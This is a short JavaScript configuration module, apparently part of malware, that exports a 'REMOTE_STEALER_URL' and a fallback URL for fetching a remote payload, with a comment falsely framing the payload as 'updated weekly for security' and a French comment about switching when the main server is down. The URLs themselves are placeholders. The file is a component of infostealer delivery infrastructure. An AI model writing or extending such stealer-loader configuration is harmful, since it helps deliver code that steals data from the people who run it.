// Remote payload URL (updated weekly for security)
const REMOTE_STEALER_URL = "https:xx";  //

// Fallback si le principal est down
const FALLBACK_URL = "https://xxx";

module.exports = { REMOTE_STEALER_URL, FALLBACK_URL };
